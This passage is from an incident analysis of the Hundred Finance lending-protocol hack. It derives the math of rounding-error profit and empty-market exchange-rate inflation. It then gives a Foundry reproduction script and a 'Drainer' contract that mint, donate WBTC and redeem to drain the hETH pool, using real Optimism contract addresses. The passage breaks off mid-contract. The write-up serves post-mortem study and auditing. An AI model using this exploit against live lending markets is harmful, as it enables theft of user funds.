+<p>To understand the vulnerability and the profit-making mechanism of the attack, it is necessary to first have an understanding of the <a href="https://docs.hundred.finance/">Hundred Finance</a> protocol, specifically the original protocol Compound v2. Due to the amount of publicly available information, a detailed introduction will not be provided here. You can refer to the <a href="https://docs.compound.finance/v2/">official documentation</a>, <a href="https://compound.finance/documents/Compound.Whitepaper.pdf">whitepaper</a>, and <a href="https://github.com/compound-finance/compound-protocol/">source code</a> for learning.</p>
+<h3 id="precision-loss-rounding-error">Precision Loss / Rounding Error</h3>
+<p>It is obvious from the analysis of the attack transaction that there is a problem of precision loss in the protocol's operations. In fact, this was first pointed out in the <a href="https://blog.openzeppelin.com/compound-audit">audit</a> by OpenZeppelin, which suggested that this might cause (very small) losses to users, where users would receive slightly less tokens than the calculated result during related operations. This is the case of precision loss that occurs in the <code>redeem</code> of the ETHDrain contract after <code>mint</code>.</p>
+<p>However, through the attack transaction, we can see that this precision loss can also enable users to profit, i.e., in the case of paying the same amount of cTokens, they can get more Underlying Tokens. This is the case of precision loss that occurs in the <code>redeemUnderlying</code> call of the ETHDrain contract.</p>
+<p>Below is the calculation of the additional amount of Underlying Tokens that can be obtained through this precision loss.</p>
+<p>For a certain lending pool, assuming there is currently:</p>
+<div class="arithmatex">\[
+\begin{align}
+C =  underlyingBalance + totalBorrowBalance - reserves \tag{1} \\  
+T = cTokenSupply \tag{2} \\
+exchangeRate = \frac{C}{T} \tag{3} 
+\end{align}
+\]</div>
+<p>And the user owns a cToken amount of <span class="arithmatex">\(kT (0 \leq k \leq 1)\)</span>. Then, the accurate amount of Underlying Tokens that can be exchanged for is:
+$$
+\begin{align}
+amountAccurate = kT \times exchangeRate = kC \tag{4}
+\end{align}
+$$</p>
+<p>While if utilizing the precision loss, the maximum amount of Underlying Tokens that can be obtained is approximately:
+$$amountMax \approx (kT+1) \times exchangeRate = kC + \frac{C}{T} \tag{5} $$</p>
+<p>Meaning the additional amount of Underlying Tokens that can be obtained is <span class="arithmatex">\(exchangeRate = \frac{C}{T}\)</span>.</p>
+<p>Taking an example from a normal <code>redeemUnderlying</code> <a href="https://etherscan.io/tx/0x5a1b6484ed92777fa6f7a7d63c0ba032b81443835e2c3e89520899a2a0f3f6c5">transaction</a> in Compound v2 on the Ethereum mainnet. In the original transaction, 37.33289964 cETH was redeemed for 0.75 Ether.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testRedeemPrecisionLoss</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="c1">// https://etherscan.io/tx/0x5a1b6484ed92777fa6f7a7d63c0ba032b81443835e2c3e89520899a2a0f3f6c5</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="c1">// 37.33289964 cETH -&gt; 0.75 Ether</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x8e445422BaA49C7b98645E918577DE7D48280384</span><span class="p">;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span>ICEther<span class="w"> </span>cETH<span class="w"> </span><span class="o">=</span><span class="w"> </span>ICEther<span class="p">(</span><span class="mh">0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5</span><span class="p">);</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span>sender<span class="p">);</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span>vm<span class="p">.</span>createSelectFork<span class="p">(</span><span class="s2">&quot;eth&quot;</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18328594</span><span class="p">);</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span>vm<span class="p">.</span>roll<span class="p">(</span><span class="m m-Decimal">18328595</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span>cETH<span class="p">.</span>accrueInterest<span class="p">();</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">exchangeRate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>cETH<span class="p">.</span>exchangeRateStored<span class="p">();</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;cETH exchangeRate&quot;</span><span class="p">,</span><span class="w"> </span>exchangeRate<span class="p">);</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">cETHAmountIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">3733289964</span><span class="p">;</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">redeemAmountAccurate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>cETHAmountIn<span class="w"> </span><span class="o">*</span><span class="w"> </span>exchangeRate<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">1</span>e18<span class="p">;</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">precisionLossProfit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>cETHAmountIn<span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span>exchangeRate<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">1</span>e18<span class="p">;</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;redeemAmountAccurate:&quot;</span><span class="p">,</span><span class="w"> </span>redeemAmountAccurate<span class="p">);</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;precisionLossProfit:&quot;</span><span class="p">,</span><span class="w"> </span>precisionLossProfit<span class="p">);</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span>cETH<span class="p">.</span>redeemUnderlying<span class="p">(</span>precisionLossProfit<span class="p">);</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">    </span><span class="c1">// 37.33289964 cETH -&gt; 0.750000000126279633 Ether</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span>vm<span class="p">.</span>stopPrank<span class="p">();</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Through the above calculation, it can be found that, according to the exchange rate at that time, 3733289964 cETH should only be exchanged for 0.749999999925384442 ETH, but due to precision loss, it can actually be exchanged for up to 0.750000000126279633 ETH.</p>
+<h3 id="empty-market">Empty Market</h3>
+<p>From the above analysis, it can be seen that although precision loss can expand the amount of Underlying Tokens that can be redeemed by a certain amount of fixed cTokens, under normal circumstances, due to the small <code>exchangeRate</code>, the additional amount that can be obtained is limited even for high-value WBTC with only 8 decimals.</p>
+<p>Therefore, according to the calculation method of <code>exchangeRate</code>, directly transferring Underlying Tokens into cToken is an obvious means to expand the rate and thereby increase the profit from precision loss. (Note that, without considering <code>accrueInterest</code>, regular <code>mint</code> or <code>redeem</code> will not change the rate.)</p>
+<p>Suppose the amount of Underlying Tokens transferred by the attacker to the cToken contract is <span class="arithmatex">\(I\)</span>, then at this point:</p>
+<div class="arithmatex">\[exchangeRate1 = \frac{C+I}{T} \tag{6}\]</div>
+<p>The amount of Underlying Tokens that can be redeemed using precision loss is:</p>
+<div class="arithmatex">\[ amountOut =  (kT+1) \times exchangeRate1 = k(C+I) + \frac{(C+I)}{T} \tag{7}\]</div>
+<p>And before the transfer, the original amount of Underlying Tokens is:</p>
+<div class="arithmatex">\[ amountIn = I + amountMax = I + kC + \frac{C}{T} \tag{8}\]</div>
+<p>To make a profit, it must satisfy:</p>
+<div class="arithmatex">\[ amountOut &gt; amountIn \tag{9} \]</div>
+<p>Combining <span class="arithmatex">\((7),(8), (9)\)</span>, we can conclude that profit requires:</p>
+<div class="arithmatex">\[I \times (k + \frac{1}{T} - 1) &gt; 0 \tag{10}\]</div>
+<p>So, along with <span class="arithmatex">\(I&gt;0\)</span>, it must satisfy:</p>
+<div class="arithmatex">\[k + \frac{1}{T} - 1 &gt; 0 \tag{11}\]</div>
+<p>Obviously, when <span class="arithmatex">\(k=1\)</span>, this condition is met. And when <span class="arithmatex">\(k\neq 1\)</span>, the larger <span class="arithmatex">\(T\)</span> is, the larger <span class="arithmatex">\(k\)</span> needs to be.</p>
+<p>In other words, when the attacker owns all the cTokens, they can meet the attack conditions. Otherwise, it depends on the current <code>cTokenSupply</code>, the more the totalSupply, the more share the attacker is required to occupy.</p>
+<p>Therefore, it is obvious that when empty markets exist, this method of transferring a large amount of Underlying Tokens can be used to manipulate the <code>exchangeRate</code> and profit from precision loss.</p>
+<p>Specifically, when an empty market is found, the attacker can <code>mint</code> cTokens, making <span class="arithmatex">\(k=1\)</span>, and the additional profit the attacker can obtain using precision loss is:</p>
+<div class="arithmatex">\[profit = amountOut - amountIn = \frac{I}{T} \tag{12}\]</div>
+<p>So, to gain more profit, the amount of funds <span class="arithmatex">\(I\)</span> transferred in should be larger, and the quantity of cTokens obtained after <code>mint</code>, i.e., <span class="arithmatex">\(T\)</span>, should be smaller.</p>
+<hr />
+<p>Now let's analyze the <a href="https://optimistic.etherscan.io/address/0x35594e4992dfefcb0c20ec487d7af22a30bdec60">hWBTC contract</a> attacked.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testEmpty</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span>vm<span class="p">.</span>createSelectFork<span class="p">(</span><span class="s2">&quot;optimism&quot;</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">89017326</span><span class="p">);</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hWBTC<span class="p">.</span>totalSupply<span class="p">();</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;empty market?&quot;</span><span class="p">,</span><span class="w"> </span>totalSupply<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">);</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Querying the contract state before the attacker's action reveals that the <code>cTotalSupply</code> of this hWBTC contract is 0, indicating that the state complies with empty markets, thus enabling the attacker to launch the attack using precision loss.</p>
+<h2 id="exploit">Exploit</h2>
+<h3 id="reproduce">Reproduce</h3>
+<p>Based on the previous analysis, combined with the attack transaction, the following script can be used for attack. Here, we only focus on attacking hETH as an example.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">blockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">89017326</span><span class="p">;</span><span class="w"> </span><span class="c1">// before the attacker&#39;s first mint</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>vm<span class="p">.</span>createSelectFork<span class="p">(</span><span class="s2">&quot;optimism&quot;</span><span class="p">,</span><span class="w"> </span>blockNumber<span class="p">);</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>WBTC<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">800</span><span class="o">*</span><span class="err">1</span>e8<span class="p">);</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// https://twitter.com/TheBlockChainer/status/1727309850810392771</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;before attack&quot;</span><span class="p">);</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;ETH balance&quot;</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18</span><span class="p">);</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WBTC balance&quot;</span><span class="p">,</span><span class="w"> </span>WBTC<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>WBTC<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_salt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">))));</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>bytecode<span class="w"> </span><span class="o">=</span><span class="w"> </span>type<span class="p">(</span>Drainer<span class="p">).</span>creationCode<span class="p">;</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>contractBytecode<span class="w"> </span><span class="o">=</span><span class="w"> </span>abi<span class="p">.</span>encodePacked<span class="p">(</span>bytecode<span class="p">,</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hEther<span class="p">)));</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">DrainAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encodePacked<span class="p">(</span>bytes1<span class="p">(</span><span class="mh">0xff</span><span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>_salt<span class="p">,</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>contractBytecode<span class="p">))))));</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span>WBTC<span class="p">.</span>transfer<span class="p">(</span>DrainAddress<span class="p">,</span><span class="w"> </span>WBTC<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">    </span>Drainer<span class="w"> </span>drainer<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span>Drainer<span class="p">{</span>salt<span class="o">:</span><span class="w"> </span><span class="kt">bytes32</span><span class="p">(</span>_salt<span class="p">)}(</span>hEther<span class="p">);</span><span class="w">  </span><span class="c1">// drain the hETH pool</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">exchangeRate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hWBTC<span class="p">.</span>exchangeRateStored<span class="p">();</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">liquidationIncentiveMantissa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">1080000000000000000</span><span class="p">;</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">priceBorrowedMantissa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>priceOracle<span class="p">.</span>getUnderlyingPrice<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hEther<span class="p">));</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">priceCollateralMantissa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>priceOracle<span class="p">.</span>getUnderlyingPrice<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">));</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">hTokenAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">liquidateAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">1</span>e18<span class="o">/</span><span class="p">(</span>priceBorrowedMantissa<span class="w"> </span><span class="o">*</span><span class="w"> </span>liquidationIncentiveMantissa<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span>exchangeRate<span class="w"> </span><span class="o">*</span><span class="w"> </span>hTokenAmount<span class="w"> </span><span class="o">*</span><span class="w"> </span>priceCollateralMantissa<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">1</span>e18<span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="w">    </span>hEther<span class="p">.</span>liquidateBorrow<span class="p">{</span>value<span class="o">:</span><span class="w"> </span>liquidateAmount<span class="p">}(</span><span class="kt">address</span><span class="p">(</span>drainer<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">));</span><span class="w"> </span><span class="c1">// liquidate to get the 1 hWBTC</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="w">    </span>hWBTC<span class="p">.</span>redeem<span class="p">(</span><span class="m m-Decimal">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// redeem to recover the empty market</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;after attack&quot;</span><span class="p">);</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;ETH balance&quot;</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18</span><span class="p">);</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WBTC balance&quot;</span><span class="p">,</span><span class="w"> </span>WBTC<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>WBTC<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="p">}</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Drainer</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>Test<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="w">    </span>ICErc20<span class="w"> </span>WBTC<span class="w"> </span><span class="o">=</span><span class="w"> </span>ICErc20<span class="p">(</span><span class="mh">0x68f180fcCe6836688e9084f035309E29Bf0A2095</span><span class="p">);</span>
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="w">    </span>ICErc20<span class="w"> </span>hWBTC<span class="w"> </span><span class="o">=</span><span class="w"> </span>ICErc20<span class="p">(</span><span class="mh">0x35594E4992DFefcB0C20EC487d7af22a30bDec60</span><span class="p">);</span>
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="w">    </span>IComptroller<span class="w"> </span>comptroller<span class="w"> </span><span class="o">=</span><span class="w"> </span>IComptroller<span class="p">(</span><span class="mh">0x5a5755E1916F547D04eF43176d4cbe0de4503d5d</span><span class="p">);</span>
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="w">    </span>ICEther<span class="w"> </span>hEther<span class="p">;</span>
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>
+</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span>ICEther<span class="w"> </span>token<span class="p">)</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="w">        </span>hEther<span class="w"> </span><span class="o">=</span><span class="w"> </span>token<span class="p">;</span>
+</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="w">        </span>WBTC<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="w">        </span>hWBTC<span class="p">.</span>mint<span class="p">(</span><span class="m m-Decimal">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="err">1</span>e8<span class="p">);</span>
+</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="w">        </span><span class="c1">// hWBTC.redeem(hWBTC.totalSupply() - 1);</span>
+</span><span id="__span-2-43"><a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="w">        </span>hWBTC<span class="p">.</span>redeem<span class="p">(</span>hWBTC<span class="p">.</span>totalSupply<span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">2</span><span class="p">);</span><span class="w">  </span><span class="c1">// get 2 hWBTC, the totalSupply is 2</span>
+</span><span id="__span-2-44"><a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a>
+</span><span id="__span-2-45"><a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">donationAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>WBTC<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-2-46"><a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="w">        </span>WBTC<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">),</span><span class="w"> </span>donationAmount<span class="p">);</span>
+</span><span id="__span-2-47"><a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="w">        </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;donationAmount:&quot;</span><span class="p">,</span><span class="w"> </span>donationAmount<span class="p">);</span>
+</span><span id="__span-2-48"><a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a>
+</span><span id="__span-2-49"><a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="w">        </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>cTokens<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">1</span><span class="p">);</span>
+</span><span id="__span-2-50"><a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a><span class="w">        </span>cTokens<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">);</span>
